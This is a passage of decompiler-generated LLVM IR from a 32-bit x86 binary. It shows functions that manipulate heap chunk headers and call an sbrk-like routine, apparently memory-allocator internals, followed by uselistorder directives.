  store i32 %v1_8053034, i32* %edx.global-to-local, align 4
  %v5_8053037 = icmp ult i32 %v1_805302f, 15
  store i32 %v1_8053034, i32* %v2_8052e77, align 4
  %v0_805303d = load i32, i32* %ecx.global-to-local, align 4
  %v1_805303d = load i32, i32* %eax.global-to-local, align 4
  %v2_805303d = add i32 %v0_805303d, 4
  %v3_805303d = add i32 %v2_805303d, %v1_805303d
  %v4_805303d = inttoptr i32 %v3_805303d to i32*
  store i32 5, i32* %v4_805303d, align 4
  %v0_8053045 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053045 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053045 = add i32 %v0_8053045, 8
  %v3_8053045 = add i32 %v2_8053045, %v1_8053045
  %v4_8053045 = inttoptr i32 %v3_8053045 to i32*
  store i32 5, i32* %v4_8053045, align 4
  br i1 %v5_8053037, label %dec_label_pc_8053076, label %dec_label_pc_805304f

dec_label_pc_805304f:                             ; preds = %dec_label_pc_8053028
  %v0_805304f = load i32, i32* @global_var_8064f24.359, align 4
  store i32 %v0_805304f, i32* @ebx, align 4
  %v0_8053055 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805305a = add i32 %v0_8053055, 8
  store i32 %v1_805305a, i32* %eax.global-to-local, align 4
  store i32 %v1_805305a, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8064f24.359, align 4
  %v1_8053068 = call i32 @function_8053391(i32 %v1_805305a)
  store i32 %v1_8053068, i32* %eax.global-to-local, align 4
  %v0_8053070 = load i32, i32* @ebx, align 4
  store i32 %v0_8053070, i32* @global_var_8064f24.359, align 4
  br label %dec_label_pc_8053076

dec_label_pc_8053076:                             ; preds = %dec_label_pc_8053028, %dec_label_pc_805300d, %dec_label_pc_8053008, %dec_label_pc_8052f37, %dec_label_pc_805304f
  %v0_8053076 = load i32, i32* @global_var_8064f48.355, align 8
  %v0_805307b = load i32, i32* @global_var_8064f4c.360, align 4
  %v0_8053087 = load i32, i32* @global_var_8064c0c.343, align 4
  store i32 %v0_8053087, i32* @ebx, align 4
  %tmp89 = icmp ule i32 %v0_8053076, %v0_805307b
  %v5_805308d = select i1 %tmp89, i32 %v0_805307b, i32 %v0_8053076
  store i32 %v5_805308d, i32* @edx, align 4
  %v1_8053090 = load i32, i32* @global_var_8064f44.354, align 4
  %v2_8053090 = add i32 %v1_8053090, %v0_8053076
  store i32 %v5_805308d, i32* @global_var_8064f4c.360, align 4
  %v1_805309c = load i32, i32* @global_var_8064f54.356, align 4
  %tmp90 = icmp ule i32 %v2_8053090, %v1_805309c
  %v5_80530a2 = select i1 %tmp90, i32 %v1_805309c, i32 %v2_8053090
  store i32 %v5_80530a2, i32* %eax.global-to-local, align 4
  store i32 %v5_80530a2, i32* @global_var_8064f54.356, align 4
  %v1_80530ae = add i32 %v0_8053087, 4
  %v2_80530ae = inttoptr i32 %v1_80530ae to i32*
  %v3_80530ae = load i32, i32* %v2_80530ae, align 4
  %v1_80530b1 = and i32 %v3_80530ae, -4
  store i32 %v1_80530b1, i32* @ecx, align 4
  %v10_80530b4 = icmp ult i32 %v1_80530b1, %v1_8052d2e
  br i1 %v10_80530b4, label %dec_label_pc_8053134, label %dec_label_pc_80530ba

dec_label_pc_80530ba:                             ; preds = %dec_label_pc_8053076
  store i32 %v1_8052db6, i32* %esi.global-to-local, align 4
  %v2_80530c0 = sub i32 %v1_80530b1, %v1_8052db6
  store i32 %v2_80530c0, i32* %ecx.global-to-local, align 4
  %v2_80530c2 = add i32 %v0_8053087, %v1_8052db6
  store i32 %v2_80530c2, i32* @edx, align 4
  %v1_80530c5 = or i32 %v1_8052db6, 1
  store i32 %v1_80530c5, i32* %eax.global-to-local, align 4
  store i32 %v2_80530c2, i32* @global_var_8064c0c.343, align 4
  store i32 %v1_80530c5, i32* %v2_80530ae, align 4
  %v0_80530d1.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80530d1

dec_label_pc_80530d1:                             ; preds = %dec_label_pc_8052d3c, %dec_label_pc_80530ba
  %v0_80530d1 = phi i32 [ %v5_8052d4f, %dec_label_pc_8052d3c ], [ %v0_80530d1.pre, %dec_label_pc_80530ba ]
  %v1_80530d1 = or i32 %v0_80530d1, 1
  store i32 %v1_80530d1, i32* @ecx, align 4
  %v0_80530d4 = load i32, i32* @ebx, align 4
  %v1_80530d4 = add i32 %v0_80530d4, 8
  store i32 %v1_80530d4, i32* %ebx.global-to-local, align 4
  %v1_80530d7 = load i32, i32* @edx, align 4
  %v2_80530d7 = add i32 %v1_80530d7, 4
  %v3_80530d7 = inttoptr i32 %v2_80530d7 to i32*
  store i32 %v1_80530d1, i32* %v3_80530d7, align 4
  br label %dec_label_pc_8053141

dec_label_pc_80530dc:                             ; preds = %dec_label_pc_8052aee
  %v5_80530e2 = sub i32 %v1_8052ad1, %v1_8052db6
  store i32 %v5_80530e2, i32* %eax.global-to-local, align 4
  %v2_80530e6 = add i32 %v0_8052b9c117, %v1_8052db6
  store i32 %v2_80530e6, i32* @edx, align 4
  %v1_80530ea = or i32 %v1_8052db6, 1
  store i32 %v2_80530e6, i32* @global_var_8064c10.344, align 16
  store i32 %v1_80530ea, i32* %v2_8052acb, align 4
  %v0_80530f6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80530f8 = or i32 %v0_80530f6, 1
  store i32 %v1_80530f8, i32* @ecx, align 4
  %v0_80530fb = load i32, i32* @edx, align 4
  store i32 %v0_80530fb, i32* @global_var_8064c1c.361, align 4
  store i32 %v0_80530fb, i32* @global_var_8064c20.346, align 32
  %v1_8053107 = add i32 %v0_80530fb, 8
  %v2_8053107 = inttoptr i32 %v1_8053107 to i32*
  store i32 ptrtoint (i32* @global_var_8064c14.345 to i32), i32* %v2_8053107, align 4
  %v0_805310e = load i32, i32* @edx, align 4
  %v1_805310e = add i32 %v0_805310e, 12
  %v2_805310e = inttoptr i32 %v1_805310e to i32*
  store i32 ptrtoint (i32* @global_var_8064c14.345 to i32), i32* %v2_805310e, align 4
  %v0_8053115 = load i32, i32* @ecx, align 4
  %v1_8053115 = load i32, i32* @edx, align 4
  %v2_8053115 = add i32 %v1_8053115, 4
  %v3_8053115 = inttoptr i32 %v2_8053115 to i32*
  store i32 %v0_8053115, i32* %v3_8053115, align 4
  %v0_8053118 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053118 = load i32, i32* @edx, align 4
  %v3_8053118 = add i32 %v1_8053118, %v0_8053118
  %v4_8053118 = inttoptr i32 %v3_8053118 to i32*
  store i32 %v0_8053118, i32* %v4_8053118, align 4
  br label %dec_label_pc_8053126

dec_label_pc_805311d:                             ; preds = %dec_label_pc_8052afd
  store i32 %v1_8052db6, i32* %ebx.global-to-local, align 4
  %v0_8053121 = load i32, i32* @ebp, align 4
  %v2_8053121 = or i32 %v1_8052db6, 4
  %v3_8053121 = add i32 %v0_8053121, %v2_8053121
  %v4_8053121 = inttoptr i32 %v3_8053121 to i32*
  %v5_8053121 = load i32, i32* %v4_8053121, align 4
  %v6_8053121 = or i32 %v5_8053121, 1
  store i32 %v6_8053121, i32* %v4_8053121, align 4
  br label %dec_label_pc_8053126

dec_label_pc_8053126:                             ; preds = %dec_label_pc_80530dc, %dec_label_pc_805311d
  %v0_8053126 = load i32, i32* @ebp, align 4
  %v1_8053126 = add i32 %v0_8053126, 8
  store i32 %v1_8053126, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053141

dec_label_pc_805312b:                             ; preds = %dec_label_pc_8052bed
  %v1_805312b = load i32, i32* @ebx, align 4
  %v2_805312b = add i32 %v0_8052bf9, 4
  %v3_805312b = add i32 %v2_805312b, %v1_805312b
  %v4_805312b = inttoptr i32 %v3_805312b to i32*
  %v5_805312b = load i32, i32* %v4_805312b, align 4
  %v6_805312b = or i32 %v5_805312b, 1
  store i32 %v6_805312b, i32* %v4_805312b, align 4
  br label %dec_label_pc_8053130

dec_label_pc_8053130:                             ; preds = %dec_label_pc_8052c05, %dec_label_pc_805312b
  %v0_8053130 = load i32, i32* @ecx, align 4
  store i32 %v0_8053130, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053141

dec_label_pc_8053134:                             ; preds = %dec_label_pc_8052ed7, %dec_label_pc_8053076, %dec_label_pc_8052f19, %dec_label_pc_8052eef
  %v0_8053134 = load i32, i32* %stack_var_-92, align 4
  %v1_8053134 = call i32 @function_8050f90(i32 %v0_8053134)
  store i32 %v1_8053134, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805313b = inttoptr i32 %v1_8053134 to i32*
  store i32 12, i32* %v1_805313b, align 4
  br label %dec_label_pc_8053141

dec_label_pc_8053141:                             ; preds = %dec_label_pc_8053130, %dec_label_pc_8053126, %dec_label_pc_80530d1, %dec_label_pc_8052d67, %dec_label_pc_8052d19, %dec_label_pc_8052a98, %dec_label_pc_8053134
  store i32 %v2_80529cf, i32* @eax, align 4
  store i32 %v2_80529cf, i32* %stack_var_-92, align 4
  %v2_805314a = call i32 @function_805405a(i32 %v2_80529cf, i32 1)
  store i32 %v2_805314a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053152

dec_label_pc_8053152:                             ; preds = %dec_label_pc_80529ed, %dec_label_pc_8053141
  %v0_8053155 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053155, i32* %eax.global-to-local, align 4
  %v2_8053157 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053157, i32* @ebx, align 4
  store i32 %v0_80529bc, i32* @esi, align 4
  store i32 %v0_80529bb, i32* @edi, align 4
  store i32 %v0_80529ba, i32* @ebp, align 4
  ret i32 %v0_8053155

; uselistorder directives
  uselistorder i32 %v0_8053118, { 1, 0 }
  uselistorder i32 %v1_805309c, { 1, 0 }
  uselistorder i32 %v2_8053090, { 1, 0 }
  uselistorder i32 %v0_805307b, { 1, 0 }
  uselistorder i32 %v0_8053076, { 0, 2, 1 }
  uselistorder i32 %v1_805300d, { 1, 0, 2 }
  uselistorder i32 %v0_805300d, { 1, 0 }
  uselistorder i32 %v2_8052ffb, { 1, 0 }
  uselistorder i32 %v1_8052fb2, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8052fa0, { 1, 0, 2 }
  uselistorder i32 %v2_8052f90, { 1, 2, 0 }
  uselistorder i32 %v2_8052f8b, { 1, 0, 2 }
  uselistorder i32 %v1_8052f7b, { 2, 1, 0 }
  uselistorder i8 %v0_8052f49, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8052f2c, { 1, 0, 2 }
  uselistorder i32 %v0_8052fee, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8052fe0, { 2, 0, 1 }
  uselistorder i32 %v8_8052efc, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_8052ee2, { 1, 0, 2 }
  uselistorder i32 %v3_8052ee2, { 1, 0 }
  uselistorder i32 %v1_8052eb0, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8052ea4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052ea0, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8052e8e, { 1, 0 }
  uselistorder i32 %v1_8052e7e, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_8052e6e, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_8052e57, { 1, 0 }
  uselistorder i32 %v2_8052e4b, { 1, 0 }
  uselistorder i32 %v2_8052e3b, { 0, 3, 1, 2 }
  uselistorder i32 %v2_8052e1f, { 1, 2, 0 }
  uselistorder i32 %v1_8052e1f, { 1, 0, 2 }
  uselistorder i32 %v1_8052e1e, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_8052e18, { 1, 0 }
  uselistorder i32 %v2_8052df6, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052dea, { 2, 1, 0 }
  uselistorder i32 %v8_8052dd5, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8052dbc, { 1, 0, 2 }
  uselistorder i32 %v0_8052d5f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8052d2e, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052d21, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052d07, { 1, 0, 2 }
  uselistorder i32 %v1_8052ca1, { 1, 0 }
  uselistorder i32 %v3_8052c96, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8052c90, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8052c8d12, { 1, 0 }
  uselistorder i32 %v2_8052c82, { 1, 0 }
  uselistorder i32 %v1_8052c66, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052c62, { 2, 1, 0 }
  uselistorder i32 %v1_8052c5e, { 1, 0 }
  uselistorder i32 %v1_8052c59, { 2, 1, 0 }
  uselistorder i32 %v2_8052c48, { 1, 0 }
  uselistorder i32 %v1_8052c45, { 1, 2, 0, 3 }
  uselistorder i32 %v4_8052be3, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_8052c2e, { 1, 0 }
  uselistorder i32 %v0_8052bf9, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052bcf, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052b9c, { 0, 2, 1 }
  uselistorder i32 %v2_8052b80, { 1, 0 }
  uselistorder i32 %v1_8052b76, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052b71.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052b61, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052b58, { 1, 0, 2 }
  uselistorder i32 %v3_8052b3b, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_8052b34, { 1, 0, 2 }
  uselistorder i32 %v2_8052b1c, { 2, 1, 0 }
  uselistorder i32 %v0_8052b08, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8052ace, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8052b9c117, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052b9c109, { 1, 0, 2 }
  uselistorder i32 %v3_8052a7b, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8052a6d, { 2, 1, 0 }
  uselistorder i32 %v2_8052a48, { 2, 1, 0 }
  uselistorder i8 %v0_8052a16, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8052db6, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_80529ff, { 1, 2, 0 }
  uselistorder i32 %v0_80529e8, { 1, 0 }
  uselistorder i32 %v2_80529cf, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 0, 12, 13, 15, 16, 17, 18, 1, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8064f40.358, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8054390, { 1, 0 }
  uselistorder i32 134630420, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8064c20.346, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8052994, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8064c0c.343 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8064c0c.343 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8053152, { 1, 0 }
  uselistorder label %dec_label_pc_8053141, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053134, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8053130, { 1, 0 }
  uselistorder label %dec_label_pc_8053126, { 1, 0 }
  uselistorder label %dec_label_pc_80530d1, { 1, 0 }
  uselistorder label %dec_label_pc_8053076, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053008, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053003, { 1, 0 }
  uselistorder label %dec_label_pc_8052fe7, { 1, 0 }
  uselistorder label %dec_label_pc_8052f90, { 1, 0 }
  uselistorder label %dec_label_pc_8052f79, { 1, 0 }
  uselistorder label %dec_label_pc_8052f62, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052f19, { 1, 0 }
  uselistorder label %dec_label_pc_8052ed7, { 1, 0 }
  uselistorder label %dec_label_pc_8052e6e, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052e0d, { 1, 0 }
  uselistorder label %dec_label_pc_8052d21, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052d19, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052c8d, { 1, 0 }
  uselistorder label %dec_label_pc_8052c92.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052c66, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052bed, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_8052b74, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052b5d, { 1, 0 }
  uselistorder label %dec_label_pc_8052acb, { 1, 0 }
  uselistorder label %dec_label_pc_8052b9c.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052a98, { 1, 0 }
  uselistorder label %dec_label_pc_8052a16, { 1, 0 }
}

define i32 @function_805315c() local_unnamed_addr {
dec_label_pc_805315c:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_805315d = load i32, i32* @edx, align 4
  store i32 %v0_805315d, i32* %ebp.global-to-local, align 4
  %v0_8053160 = load i32, i32* @esi, align 4
  %v1_8053165 = add i32 %v0_805315d, 860
  %v2_8053165 = inttoptr i32 %v1_8053165 to i32*
  %v3_8053165 = load i32, i32* %v2_8053165, align 4
  store i32 %v3_8053165, i32* @ecx, align 4
  %v1_805316b = add i32 %v0_805315d, 44
  %v2_805316b = inttoptr i32 %v1_805316b to i32*
  %v3_805316b = load i32, i32* %v2_805316b, align 4
  %v1_805316e = add i32 %v3_805316b, 4
  %v2_805316e = inttoptr i32 %v1_805316e to i32*
  %v3_805316e = load i32, i32* %v2_805316e, align 4
  %v1_8053171 = and i32 %v3_805316e, -4
  store i32 %v1_8053171, i32* @esi, align 4
  %v1_8053176 = load i32, i32* @eax, align 4
  %v2_8053176 = add i32 %v3_8053165, -17
  %v2_8053178 = add i32 %v2_8053176, %v1_8053171
  %v3_8053178 = sub i32 %v2_8053178, %v1_8053176
  %div = udiv i32 %v3_8053178, %v3_8053165
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_8053178, %v3_8053165
  store i32 %tmp10, i32* @edx, align 4
  %v1_8053180 = add i32 %div, -1
  %v4_8053183 = mul i32 %v1_8053180, %v3_8053165
  store i32 %v4_8053183, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8053183, 1
  br i1 %tmp11, label %dec_label_pc_80531df, label %dec_label_pc_805318a

dec_label_pc_805318a:                             ; preds = %dec_label_pc_805315c
  %v1_805318f = call i32 @function_805457c(i32 0)
  store i32 %v1_805318f, i32* %edi.global-to-local, align 4
  %v0_8053199 = load i32, i32* @esi, align 4
  store i32 %v0_8053199, i32* %eax.global-to-local, align 4
  %v1_805319b = load i32, i32* %ebp.global-to-local, align 4
  %v2_805319b = add i32 %v1_805319b, 44
  %v3_805319b = inttoptr i32 %v2_805319b to i32*
  %v4_805319b = load i32, i32* %v3_805319b, align 4
  %v5_805319b = add i32 %v4_805319b, %v0_8053199
  store i32 %v5_805319b, i32* %eax.global-to-local, align 4
  %v12_805319e = icmp eq i32 %v1_805318f, %v5_805319b
  %v1_80531a0 = icmp eq i1 %v12_805319e, false
  br i1 %v1_80531a0, label %dec_label_pc_80531df, label %dec_label_pc_80531a2

dec_label_pc_80531a2:                             ; preds = %dec_label_pc_805318a
  %v1_80531a5 = sub i32 0, %v4_8053183
  store i32 %v1_80531a5, i32* @ebx, align 4
  %v1_80531a8 = call i32 @function_805457c(i32 %v1_80531a5)
  store i32 %v1_80531a8, i32* %eax.global-to-local, align 4
  %v1_80531b4 = call i32 @function_805457c(i32 0)
  store i32 %v1_80531b4, i32* %eax.global-to-local, align 4
  %v10_80531bc = icmp eq i32 %v1_80531b4, -1
  br i1 %v10_80531bc, label %dec_label_pc_80531df, label %dec_label_pc_80531c1

dec_label_pc_80531c1:                             ; preds = %dec_label_pc_80531a2
  %v0_80531c1 = load i32, i32* %edi.global-to-local, align 4
  %v2_80531c3 = sub i32 %v0_80531c1, %v1_80531b4
  %v12_80531c3 = icmp eq i32 %v2_80531c3, 0
  store i32 %v2_80531c3, i32* @ecx, align 4
  br i1 %v12_80531c3, label %dec_label_pc_80531df, label %dec_label_pc_80531c7

dec_label_pc_80531c7:                             ; preds = %dec_label_pc_80531c1
  %v0_80531c7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80531c7 = add i32 %v0_80531c7, 44
  %v2_80531c7 = inttoptr i32 %v1_80531c7 to i32*
  %v3_80531c7 = load i32, i32* %v2_80531c7, align 4
  store i32 %v3_80531c7, i32* %eax.global-to-local, align 4
  %v0_80531ca = load i32, i32* @esi, align 4
  %v2_80531ca = sub i32 %v0_80531ca, %v2_80531c3
  store i32 %v2_80531ca, i32* %esi.global-to-local, align 4
  %v1_80531cc = add i32 %v0_80531c7, 872
  %v2_80531cc = inttoptr i32 %v1_80531cc to i32*
  %v3_80531cc = load i32, i32* %v2_80531cc, align 4
  %v5_80531cc = sub i32 %v3_80531cc, %v2_80531c3
  store i32 %v5_80531cc, i32* %v2_80531cc, align 4
  %v0_80531d2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80531d2 = or i32 %v0_80531d2, 1
  store i32 %v1_80531d2, i32* %esi.global-to-local, align 4
  %v1_80531d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80531d5 = add i32 %v1_80531d5, 4
  %v3_80531d5 = inttoptr i32 %v2_80531d5 to i32*
  store i32 %v1_80531d2, i32* %v3_80531d5, align 4
  br label %dec_label_pc_80531e1

dec_label_pc_80531df:                             ; preds = %dec_label_pc_80531c1, %dec_label_pc_80531a2, %dec_label_pc_805318a, %dec_label_pc_805315c
  br label %dec_label_pc_80531e1

dec_label_pc_80531e1:                             ; preds = %dec_label_pc_80531c7, %dec_label_pc_80531df
  %storemerge = phi i32 [ 1, %dec_label_pc_80531c7 ], [ 0, %dec_label_pc_80531df ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8053160, i32* %esi.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80531b4, { 1, 0, 2 }
  uselistorder i32 %v4_8053183, { 1, 2, 0 }
  uselistorder i32 %v3_8053165, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_805315d, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_805457c, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_80531e1, { 1, 0 }
}

define i32 @function_80531e9(i32* %arg1) local_unnamed_addr {
dec_label_pc_80531e9:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_80531ea = load i32, i32* @edi, align 4
  %v0_80531eb = load i32, i32* @esi, align 4
  %v0_80531ec = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_80531f4 = load i32, i32* %arg1, align 4
  store i32 %v2_80531f4, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_80531fb = icmp eq i32 %v2_80531f4, 0
  br i1 %v1_80531fb, label %dec_label_pc_8053324.preheader, label %dec_label_pc_8053203

dec_label_pc_8053324.preheader:                   ; preds = %dec_label_pc_80531e9
  %v3_8053319 = add i32 %tmp11, 44
  br label %dec_label_pc_8053315

dec_label_pc_8053203:                             ; preds = %dec_label_pc_80531e9
  %v1_8053207 = and i32 %v2_80531f4, -3
  store i32 %v1_8053207, i32* %arg1, align 4
  %v1_805320c = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_805321b = add i32 %tmp11, 4
  store i32 %v1_805321b, i32* %eax.global-to-local, align 4
  %v2_8053222 = load i32, i32* %arg1, align 4
  %v2_8053228 = udiv i32 %v2_8053222, 8
  %v2_805322b = mul nuw i32 %v2_8053228, 4
  %v3_805322b = add i32 %tmp11, -4
  %v4_805322b = add i32 %v3_805322b, %v2_805322b
  store i32 %v4_805322b, i32* %eax.global-to-local, align 4
  %v2_80532f2 = add i32 %tmp11, 44
  %v3_80532f2 = inttoptr i32 %v2_80532f2 to i32*
  %v1_80532c5 = add i32 %tmp11, 60
  %v2_80532c5 = inttoptr i32 %v1_80532c5 to i32*
  br label %dec_label_pc_8053233

dec_label_pc_8053233:                             ; preds = %dec_label_pc_805330b, %dec_label_pc_8053203
  %v0_8053241 = phi i32 [ %v1_805321b, %dec_label_pc_8053203 ], [ %v4_805330b, %dec_label_pc_805330b ]
  store i32 %v0_8053241, i32* %eax.global-to-local, align 4
  %v1_8053237 = inttoptr i32 %v0_8053241 to i32*
  %v2_8053237 = load i32, i32* %v1_8053237, align 4
  store i32 %v2_8053237, i32* @ecx, align 4
  %v1_8053239 = icmp eq i32 %v2_8053237, 0
  br i1 %v1_8053239, label %dec_label_pc_8053301, label %dec_label_pc_8053241

dec_label_pc_8053241:                             ; preds = %dec_label_pc_8053233
  store i32 0, i32* %v1_8053237, align 4
  %v0_8053247.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8053247

dec_label_pc_8053247:                             ; preds = %dec_label_pc_80532f5, %dec_label_pc_8053241
  %v0_8053264 = phi i32 [ %v3_8053247, %dec_label_pc_80532f5 ], [ %v0_8053247.pre, %dec_label_pc_8053241 ]
  %v1_8053247 = add i32 %v0_8053264, 8
  %v2_8053247 = inttoptr i32 %v1_8053247 to i32*
  %v3_8053247 = load i32, i32* %v2_8053247, align 4
  store i32 %v3_8053247, i32* %edx.global-to-local, align 4
  %v1_805324e = add i32 %v0_8053264, 4
  %v2_805324e = inttoptr i32 %v1_805324e to i32*
  %v3_805324e = load i32, i32* %v2_805324e, align 4
  store i32 %v3_805324e, i32* %eax.global-to-local, align 4
  %v1_8053253 = and i32 %v3_805324e, -2
  store i32 %v1_8053253, i32* @edi, align 4
  %v2_8053256 = urem i32 %v3_805324e, 2
  %v3_8053256 = icmp eq i32 %v2_8053256, 0
  %v2_8053258 = add i32 %v1_8053253, %v0_8053264
  store i32 %v2_8053258, i32* @ebx, align 4
  %v1_805325b = add i32 %v2_8053258, 4
  %v2_805325b = inttoptr i32 %v1_805325b to i32*
  %v3_805325b = load i32, i32* %v2_805325b, align 4
  store i32 %v3_805325b, i32* %edx.global-to-local, align 4
  %v1_8053262 = icmp eq i1 %v3_8053256, false
  br i1 %v1_8053262, label %dec_label_pc_8053284, label %dec_label_pc_8053264

dec_label_pc_8053264:                             ; preds = %dec_label_pc_8053247
  %v1_8053264 = inttoptr i32 %v0_8053264 to i32*
  %v2_8053264 = load i32, i32* %v1_8053264, align 4
  store i32 %v2_8053264, i32* %ebp.global-to-local, align 4
  %v2_8053268 = sub i32 %v0_8053264, %v2_8053264
  store i32 %v2_8053268, i32* %eax.global-to-local, align 4
  %v1_805326a = add i32 %v2_8053268, 8
  %v2_805326a = inttoptr i32 %v1_805326a to i32*
  %v3_805326a = load i32, i32* %v2_805326a, align 4
  store i32 %v3_805326a, i32* @esi, align 4
  %v1_805326d = add i32 %v2_8053268, 12
  %v2_805326d = inttoptr i32 %v1_805326d to i32*
  %v3_805326d = load i32, i32* %v2_805326d, align 4
  store i32 %v3_805326d, i32* %edx.global-to-local, align 4
  %v1_8053270 = add i32 %v3_805326a, 12
  %v2_8053270 = inttoptr i32 %v1_8053270 to i32*
  %v3_8053270 = load i32, i32* %v2_8053270, align 4
  store i32 %v3_8053270, i32* @ecx, align 4
  %v12_8053273 = icmp eq i32 %v3_8053270, %v2_8053268
  %v1_8053275 = icmp eq i1 %v12_8053273, false
  br i1 %v1_8053275, label %dec_label_pc_80532b4, label %dec_label_pc_8053277

dec_label_pc_8053277:                             ; preds = %dec_label_pc_8053264
  %v1_8053277 = add i32 %v3_805326d, 8
  %v2_8053277 = inttoptr i32 %v1_8053277 to i32*
